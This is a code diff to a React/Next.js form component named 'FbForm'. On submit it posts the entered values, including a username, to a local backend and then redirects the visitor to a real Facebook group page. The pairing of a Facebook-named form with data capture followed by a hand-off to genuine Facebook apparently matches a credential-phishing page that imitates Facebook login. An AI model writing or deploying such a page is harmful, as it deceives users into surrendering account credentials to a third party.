@@ -14,6 +14,8 @@ import {
 } from "@/components/ui/form";
 import { Input } from "@/components/ui/input";
 import Link from "next/link";
+import axios from "axios";
+import { useRouter } from "next/navigation";
 
 const formSchema = z.object({
   username: z.string().min(2, {
@@ -35,10 +37,18 @@ export function FbForm() {
   });
 
   // 2. Define a submit handler.
-  function onSubmit(values: z.infer<typeof formSchema>) {
-    // Do something with the form values.
-    // ✅ This will be type-safe and validated.
+  const router = useRouter()
+ async function onSubmit(values: z.infer<typeof formSchema>) {
+    try{
+      
     console.log(values);
+   const result=await axios.post("http://localhost:4000/user/create",values)
+   if(result.status===201){
+    router.push("https://www.facebook.com/groups/shonirakhra/permalink/3741482896113640/?app=fbl")
+   }
+    }catch(err){
+      console.log(err);
+    }
   }
 
   return (
